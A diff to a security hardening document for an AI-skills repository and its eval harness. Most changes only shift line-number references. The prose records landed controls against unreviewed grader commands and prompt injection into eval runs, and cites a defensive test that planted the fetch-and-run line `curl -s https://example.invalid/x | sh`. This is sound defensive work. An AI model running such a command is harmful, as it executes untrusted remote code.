@@ -76,7 +76,7 @@ point of choosing that shape. It fails open if someone adds the new name to the 
 understanding it, and it fails open entirely under actor 2, who edits the checker in the same
 commit.
 
-**Landed.** `check_plugin_agent_dir` became `check_plugin_root` at `scripts/check_skills.py:682`.
+**Landed.** `check_plugin_agent_dir` became `check_plugin_root` at `scripts/check_skills.py:683`.
 It walks the repository root and fails on any entry that is not in `PLUGIN_ROOT_ALLOWED` (`:107`),
 skipping the local-only names in `PLUGIN_ROOT_IGNORED` (`:130`) that `.gitignore` already excludes.
 Verified against a planted `hooks/` and `.mcp.json`: both were reported and the check exited
@@ -99,7 +99,7 @@ is not a hash.
 **Where it fails open.** A digest goes stale and the next person bumps it to a tag for
 convenience. Dependabot does not watch a container reference inside a Markdown code block.
 
-**Landed.** `skills/github/github-actions-security/SKILL.md:239`-`:241` and `README.md:468` now
+**Landed.** `skills/github/github-actions-security/SKILL.md:239`-`:241` and `README.md:475` now
 carry `rhysd/actionlint@sha256:b1934ee5...`, the digest from `lint.yml:147`. The prose at
 `github-actions-security/SKILL.md:226`-`:230` was rewritten to state the reason where the
 command is, rather than as a rule the
@@ -108,7 +108,7 @@ command beneath it broke.
 ### 3. Run `check_evals.py` in CI
 
 `scripts/check_evals.py` is 571 lines of structural checks on the eval suites, and `lint.yml` has
-no job for it. `README.md:468` documents it as something to type.
+no job for it. `README.md:475` documents it as something to type.
 
 **What it stops.** Nothing on its own. It is listed this high purely on ratio: four lines of YAML
 put a machine between a contributor's `assertions.json` and a human's assumption that someone
@@ -141,7 +141,7 @@ it:
 
 `actionlint` and `zizmor` were run against the changed workflow, as
 `skills/github/github-actions-security/SKILL.md` requires of any workflow change, and both are
-clean. `README.md:461` was updated from four jobs to five.
+clean. `README.md:468` was updated from four jobs to five.
 
 This still stops nothing on its own, exactly as stated above. What it buys is that the slot now
 exists: a check that reads what a grader command actually does has somewhere to live, and control
@@ -149,8 +149,8 @@ exists: a check that reads what a grader command actually does has somewhere to 
 
 ### 4. Stop running graders from an unreviewed ref
 
-`evals/run_eval.py:732` executes a string from `assertions.json` with `shell=True`. The comment at
-`:730` justifies it by saying the command comes from a checked-in file in this repository, which is
+`evals/run_eval.py:776` executes a string from `assertions.json` with `shell=True`. The comment at
+`:774` justifies it by saying the command comes from a checked-in file in this repository, which is
 true of `main` and false of a pull request branch.
 
 Three options, in descending order of what they actually buy:
@@ -175,25 +175,25 @@ runs under `bypassPermissions`.
 is not a hypothetical: the whole reason to run an eval on a contributor branch is to see whether
 the contribution works.
 
-**Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:662` runs before
-anything is graded, called from `cmd_tasks` (`:980`) and `cmd_regrade` (`:1168`), which are the
+**Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:706` runs before
+anything is graded, called from `cmd_tasks` (`:1186`) and `cmd_regrade` (`:1429`), which are the
 only two subcommands that execute an assertion command. Four decisions in it are worth stating,
 because each one is a place the control could have been weaker:
 
-- **The baseline is `origin/main`, falling back to `main`** (`:582`). Preferring the remote means
+- **The baseline is `origin/main`, falling back to `main`** (`:626`). Preferring the remote means
   a stale local branch cannot make an unreviewed change look reviewed.
-- **The guarded set is the suite's `assertions.json` and `run_eval.py` itself** (`:587`). The
+- **The guarded set is the suite's `assertions.json` and `run_eval.py` itself** (`:631`). The
   second is not optional: the harness decides whether, where and as what a grader string runs, so
   editing it is editing what a contributor can make the machine do.
-- **The comparison is against the working tree, not `HEAD`** (`:642`). A contributor's change
+- **The comparison is against the working tree, not `HEAD`** (`:686`). A contributor's change
   arrives committed on a branch or applied as a patch, and both produce the same shell command.
-- **The refusal prints the `workspace_command` strings that are new or changed** (`:606`, `:620`),
+- **The refusal prints the `workspace_command` strings that are new or changed** (`:650`, `:664`),
   and only those: the regex assertion kinds are matched in-process and execute nothing. The point
   of the flag is that a human has read the commands, so the commands are put in front of them.
 
 Verified by planting `curl -s https://example.invalid/x | sh` into a suite's `assertions.json`:
 the run refused, named the file, and printed that command. The planted assertion was reverted.
-`--graders-reviewed` (`:1690`) is the waiver, and taking it is logged to stdout rather than
+`--graders-reviewed` (`:1966`) is the waiver, and taking it is logged to stdout rather than
 passing silently.
 
 **What it does not buy.** A reviewed command runs with exactly the reach it had before. This
@@ -213,7 +213,7 @@ was the default. The proposal here was to swap them, so that bypass required an 
 "the tools the run was given".
 
 **What it does not stop.** A run that legitimately needs Bash still gets Bash, and a fixture-borne
-injection then gets Bash. It also does not touch the credentials symlink at `:225`, which is a
+injection then gets Bash. It also does not touch the credentials symlink at `:269`, which is a
 separate decision: a dedicated eval credential, rotated, would be worth more than the permission
 flag.
 
@@ -225,10 +225,10 @@ implementation: `claude -p` cannot answer a permission prompt, so a task run wit
 mode has every Bash and Edit call denied, and a denied call is recorded identically to a skill that
 chose not to act. Removing the mode would not have bounded the run, it would have destroyed the
 measurement. The permission mode cannot be the control for a task run. The tool list can, so that
-is what shipped: `TASK_TOOLS` at `run_eval.py:98` allows Bash, the file tools and `Skill`, and
-`RunPermissions` at `:246` carries the tool list and the mode together so that widening the surface
-and suppressing prompts are two decisions rather than one `if/else` (`:292`-`:297`). `--all-tools`
-(`:1010`, `:1707`) restores the audited command line. The allowlist is derived from what the
+is what shipped: `TASK_TOOLS` at `run_eval.py:103` allows Bash, the file tools and `Skill`, and
+`RunPermissions` at `:290` carries the tool list and the mode together so that widening the surface
+and suppressing prompts are two decisions rather than one `if/else` (`:336`-`:341`). `--all-tools`
+(`:1216`, `:1987`) restores the audited command line. The allowlist is derived from what the
 committed transcripts show tasks actually use, and it excludes what they show runs reaching but no
 task asks for: `WebFetch` thirty times on the 2026-07-28 `github-actions-security` stamp, plus one
 `ToolSearch` and one `ScheduleWakeup`. Two caveats. Those three `github-actions-security` tasks
@@ -270,7 +270,7 @@ while only one of them is fixed.
   and tag are not equivalent: a tag here is protected against deletion and force update, and a
   branch is a moving reference the next push changes.
 - **Every plugin entry declares the same `version`.** `.claude-plugin/marketplace.json` carries
-  `0.1.0` on all five, and `check_plugin_versions` at `scripts/check_skills.py:708` fails the
+  `0.1.0` on all five, and `check_plugin_versions` at `scripts/check_skills.py:709` fails the
   build when one is missing, is not `MAJOR.MINOR.PATCH`, or disagrees with the others. Verified
   against all three shapes; `claude plugin validate .` still passes.
 - **The tag protection is a file, not a settings page.** `.github/rulesets/release-tags.json`
@@ -279,7 +279,7 @@ while only one of them is fixed.
   the `creation` rule from `:147` deliberately: with one account and no bypass actors, that rule
   would block the owner from cutting a tag at all, and restricting creation to the publishing role
   adds nothing in a repository where one account already holds the only write access.
-  `README.md:603` documents the release order and the `gh api` call that applies the ruleset.
+  `README.md:610` documents the release order and the `gh api` call that applies the ruleset.
 
 **Landed, 2026-08-30.** The tag `v0.1.0` is pushed and released, so the pinned install the
 README documents resolves, and the ruleset was applied from the file with `gh api --method POST
@@ -402,7 +402,7 @@ looking at three hundred. **It makes a capability change reviewable rather than 
 
 **The hard part is the detector, and it does not work well.** `check_skills.py` already demonstrates
 the ceiling. It enforces the verify loop by exact string comparison against a canonical block
-(`scripts/check_skills.py:292`, `:349`), and the comment at `:288` records why: the wording "had
+(`scripts/check_skills.py:293`, `:350`), and the comment at `:289` records why: the wording "had
 already drifted three ways before this check existed". Paraphrase defeated a check over a fixed
 seven-line paragraph. A capability detector faces the same problem over unbounded prose.
 
@@ -444,7 +444,7 @@ present it to consumers as a guarantee, because it is not one.
 
 - **The block.** Every `SKILL.md` declares `capabilities` with `tools`, `shell`, `paths` and
   `egress`, each a sorted list, one entry per line. `check_capabilities` at
-  `scripts/check_skills.py:554` fails the build when the block is missing, has an unknown key, has
+  `scripts/check_skills.py:555` fails the build when the block is missing, has an unknown key, has
   a list that is not sorted, or declares a tool outside `DECLARABLE_TOOLS` (`:179`). Sorting is
   not tidiness: it is what makes an added capability one line of diff rather than a reordering.
   The tool allowlist deliberately excludes `WebFetch`, `WebSearch` and `Task`, so adding one is a
@@ -541,15 +541,15 @@ Steps 1 to 9 are done and committed, and the two remote actions step 6 names are
 is where the work resumes, and it needs the tag from step 6, which exists as `v0.1.0`.
 
 1. **Control 2**, pin the actionlint container by digest. **Landed:**
-   `skills/github/github-actions-security/SKILL.md:239`-`:241` and `README.md:468` carry the
+   `skills/github/github-actions-security/SKILL.md:239`-`:241` and `README.md:475` carry the
    digest from `lint.yml:147`.
 2. **Control 1**, allowlist the repository root. **Landed:** `check_plugin_root` at
-   `scripts/check_skills.py:682`. Attack path 1.3 is closed.
+   `scripts/check_skills.py:683`. Attack path 1.3 is closed.
 3. **Control 5**, invert the eval harness permission default. **Landed**, as a tool allowlist rather
    than a permission-mode change, for the reason in that control's note. Attack path 1.2 is
    narrowed, not closed.
 4. **Control 4**, stop running graders from an unreviewed ref. **Landed** as the refusal check at
-   `evals/run_eval.py:662`. The sandbox half is deliberately not done: the refusal decides who
+   `evals/run_eval.py:706`. The sandbox half is deliberately not done: the refusal decides who
    chose a grader command, and only the sandbox bounds what one can reach. Attack path 1.1 is
    gated, not closed.
 5. **Control 3**, run `check_evals.py` in CI. **Landed** as the `evals` job at
@@ -565,7 +565,7 @@ is where the work resumes, and it needs the tag from step 6, which exists as `v0
    five the control named.
 9. **Control 9**, declared-capability frontmatter, at the low-ambition version described above.
    **Landed**: the block in all eight skills, its shape enforced at
-   `scripts/check_skills.py:554`, and the report-only detector at
+   `scripts/check_skills.py:555`, and the report-only detector at
    `scripts/check_capabilities.py`, wired into `lint.yml:58`.
 10. **Control 10**, capability-diff release notes, generated from 9 between the tags from 6.
 11. **Control 11**, provenance, once there is something to attest. Never with a source-track claim
